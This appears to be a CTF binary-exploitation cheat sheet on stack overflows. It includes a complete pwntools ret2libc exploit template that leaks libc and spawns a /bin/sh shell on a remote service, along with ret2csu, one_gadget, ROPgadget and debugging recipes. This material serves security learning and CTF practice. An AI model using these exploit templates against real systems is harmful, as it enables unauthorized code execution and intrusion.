# Stack Pwn

## Trigger conditions and pre-detection

### checksec interpretation

```bash
checksec --file=./vuln
# Or pwntools comes with
python -c "from pwn import *; print(ELF('./vuln'))"
```

| Output fields | Impact | Response |
|---------|------|------|
| `NX disabled` | Stack executable | Directly insert shellcode |
| `Canary found` | Stack overflow will be detected | Must leak canary or bypass (forked process / format string) first |
| `PIE enabled` | .text base address is random | must leak a code address |
| `No PIE` | .text fixed | gadget address hard-coded |
| `Full RELRO` | got cannot be written | cannot change got, use ret2libc / one_gadget |
| `Partial RELRO` | got can be written | can change the got table |
| `FORTIFY` | Some libc functions have been replaced with `_chk` versions | `read_chk` can still overflow, `strcpy_chk` cannot |

### Accurate positioning of stack overflow length

```python
# pwntools cyclic mode
from pwn import *
context.arch = 'amd64'

# 1. Generate cyclic pattern
payload = cyclic(200)

# 2. Feeding program triggers crash
p = process('./vuln')
p.sendline(payload)
p.wait()

# 3. Read the value on RSP from core dump
core = p.corefile
fault = core.fault_addr  # or the 8 bytes pointed to by core.rsp
offset = cyclic_find(fault & 0xffffffff) # 32-bit mode
# 64-bit uses cyclic_find(p64(fault)[:8])
log.info(f"offset = {offset}")
```

### 32 / 64 bit calling convention quick check

| Architecture | Parameter passing | Return | Remarks |
|------|---------|------|------|
| x86 (32-bit) | Stack parameters (cdecl: caller clears the stack) | eax | Stack structure: ret_addr, arg1, arg2, ... |
| x86-64 SysV | rdi, rsi, rdx, rcx, r8, r9, stack | rax | rsp must be 16-byte aligned to the call entry |
| ARM32 | r0-r3, stack | r0 | lr saves the return address, bx lr returns |
| ARM64 | x0-x7, stack | x0 | Similar to SysV, stricter alignment |

## ret2libc complete pwntools template

```python
#!/usr/bin/env python3
from pwn import *

# === Environment configuration ===
exe = './vuln'
libc_path = './libc.so.6'
HOST, PORT = 'chal.example.com', 31337

context.binary = elf = ELF(exe)
context.log_level = 'info'
libc = ELF(libc_path)

# Automatic patchelf allows the local to use the libc given in the question
# patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . ./vuln

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(exe, gdbscript='''
            b *main+123
            continue
        ''')
    return process(exe)

# === Stage 1: leak libc ===
p = conn()

OFFSET = 0x48  # Measured through cyclic
pop_rdi = 0x0000000000401383  # ROPgadget --binary ./vuln --only "pop|ret" | grep rdi
ret     = 0x000000000040101a  # for stack alignment

payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])     # Let puts print puts@got's own address
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])     # Return to main and reuse stack overflow for the second round

p.sendlineafter(b'> ', payload)

# Receive leak (note the recvuntil anchor string, do not use sleep)
p.recvuntil(b'bye\n')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f'leaked puts @ {hex(leak)}')

# Check libc base
libc.address = leak - libc.sym['puts']
log.success(f'libc base = {hex(libc.address)}')

# === Stage 2: ret2libc system("/bin/sh") ===
binsh    = next(libc.search(b'/bin/sh\x00'))
system   = libc.sym['system']

payload  = b'A' * OFFSET
payload += p64(ret)        # Key: Complete 16-byte alignment
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendlineafter(b'> ', payload)

p.interactive()
```

### Stack alignment pitfalls (must read)

```text
Phenomenon: The local system can be connected, but the remote system shows SIGSEGV as soon as it is entered.
Reason: libc's system → do_system → somewhere inside movaps xmm0, [rsp]
       Requires rsp 16-byte alignment
Failure: When your ROP chain jumps into system, the last bit of rsp is 0x8 instead of 0x0
Fix: Insert a `ret` gadget in the ROP chain (consumes 8 bytes and allows rsp to realign)
```

## ret2csu (universal gadget)

When there is no third parameter gadget such as `pop rdx; ret` in the binary, the fixed structure in `__libc_csu_init` is used (available in statically linked programs with glibc < 2.34).

```text
Fixed pattern at the end of __libc_csu_init:
    add  rsp, 8
    pop  rbx
    pop  rbp
    pop  r12
    pop  r13
    pop  r14
    pop  r15
    ret

In between there are:
    mov  rdx, r15  ; r15 → rdx
    mov  rsi, r14  ; r14 → rsi
    mov edi, r13d ; r13 → rdi (lower 32 bits)
    call qword ptr [r12 + rbx*8]
```

pwntools writing method:

```python
csu_pop = 0x40119a  # The first paragraph (pop rbx..r15; ret)
csu_call = 0x401180  # Second paragraph (mov rdx,r15; ... ; call [r12+rbx*8])

def csu(rdi, rsi, rdx, call_target):
    p  = p64(csu_pop)
    p += p64(0)              # rbx = 0
p += p64(1) # rbp = 1 (to make the subsequent cmp rbx,rbp pass → rbx+1 == rbp)
p += p64(call_target) # r12 = [r12+rbx*8] Dereference to get the target
    p += p64(rdi)            # r13
    p += p64(rsi)            # r14
    p += p64(rdx)            # r15
    p += p64(csu_call)
    p += b'\x00' * 8 * 7     # The second paragraph is followed by 7 pops after ret
    return p
```

Applicable: Write a function pointer in bss, and then call it with csu. It is often used to jump to bss after the `read(0, bss, 0x100)` stage to perform ROP.

## one_gadget usage

```bash
one_gadget ./libc.so.6

# The output is similar to:
# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
```

use:

```python
og = [0xe3afe, 0xe3b01, 0xe3b04]
payload  = b'A' * OFFSET
payload += p64(ret)
payload += p64(libc.address + og[1])  # Pick the one that satisfies the constraints
```

**Pitfall**: one_gadget constraints are extremely difficult to satisfy in some libc versions (2.34+), and honestly ret2libc is more stable.

## libc-database reverse check

Scenario: The question does not give libc, so it can only leak a few function address reverse versions.

```bash
cd ~/tools/libc-database

# Use the leaked puts and read addresses (take the last 3 digits) to reverse check
./find puts 0x6f0 read 0xfd
# Output: libc6_2.31-0ubuntu9.9_amd64

# Get all symbol offsets corresponding to libc
./dump libc6_2.31-0ubuntu9.9_amd64

# Download actual libc.so.6 to local
ls db/libc6_2.31-0ubuntu9.9_amd64.so
```

pwntools integration:

```python
# Online libc-database query (no local required)
from pwnlib.libcdb import search_by_symbol_offsets
libs = search_by_symbol_offsets({'puts': 0x6f0, 'read': 0xfd})
libc = ELF(libs[0])
```

## ROPgadget Quick Facts

```bash
# Basics: pop|ret single reg
ROPgadget --binary ./vuln --only "pop|ret"

# Find syscall
ROPgadget --binary ./vuln | grep ': syscall'

# Find specific bytes
ROPgadget --binary ./libc.so.6 --only "pop|ret" | grep 'pop rdi'

# Find string
ROPgadget --binary ./libc.so.6 --string '/bin/sh'

# Output JSON to the program for parsing
ROPgadget --binary ./vuln --json > gadgets.json
```

Ropper alternative (wider architecture support):

```bash
ropper --file ./vuln --search "pop rdi; ret"
ropper --file ./libc.so.6 --search "syscall"
```

## Remote Stabilization Checklist

| Problem | Phenomenon | Solution |
|------|------|------|
| Wrong libc version | Local communication, remote SIGSEGV in system | Use libc-database to check the actual version after leak |
| Stack alignment | System segfaults immediately | Add a `ret` gadget |
| Network delay | recv received half | Use `recvuntil(b'anchor string')` instead of `sleep` |
| Buffering | No response after sendline is sent | Change `sendlineafter` to explicitly wait until prompt before sending |
| ASLR float | Probability of success | Check if byte-level brute (1/16 probability is not stable) |
| TCP nagle | Small packet merging | `p.settimeout(2); p.recvall(timeout=2)` guaranteed |

## Debugging Tips

```python
# pwntools embedded gdb attach
p = process('./vuln')
gdb.attach(p, '''
    b *main+0x123
    b *0x401234
    commands
        telescope $rsp 20
        continue
    end
''')

# Run in gdb from the beginning
p = gdb.debug('./vuln', '''
    set follow-fork-mode child
    b main
''')
```

GEF/pwndbg common commands:

```text
checksec               # Look at protection
vmmap                  # memory layout
telescope $rsp 30      # stack link (pwndbg)
stack 30               # Similar(GEF)
got # GOT table
search-pattern "/bin/sh"
context                # Automatically display reg + stack + code (on by default)
ropgadget              # Embedded gadget search
```

## Things to note

- **NX off + ASLR off** can directly shellcode; modern binaries basically turn on NX
- **canary is unchanged in the fork child process** — the forking server can explode byte at a time (1/256 × 7 bytes)
- **Format string can leak canary and libc at the same time** — use `%p %p ... %p` to scan the stack
- **DynELF is slow but versatile** — When libc is not provided at all, pwntools’ `DynELF` can rely solely on the program’s own IO primitives to leak the symbol table byte by byte.
- **Static linked programs do not have libc.got** — use SROP (sigreturn-oriented programming) or direct syscall
